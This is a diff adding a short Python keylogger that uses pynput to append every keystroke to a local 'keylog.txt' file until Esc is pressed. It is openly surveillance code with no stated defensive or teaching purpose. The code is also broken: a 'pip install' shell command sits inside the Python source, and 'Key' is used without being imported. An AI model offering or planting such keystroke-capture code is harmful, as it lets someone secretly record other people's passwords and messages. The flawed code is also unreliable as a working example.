@@ -1,0 +1,20 @@
+pip install pynput
+from pynput.keyboard import Listener
+
+# Function to log the pressed keys into a file
+def on_press(key):
+    try:
+        with open("keylog.txt", "a") as f:
+            f.write(f"{key.char} ")
+    except AttributeError:
+        with open("keylog.txt", "a") as f:
+            f.write(f"{key} ")
+
+# Stop the listener if the 'esc' key is pressed
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+# Start listening to the keyboard
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
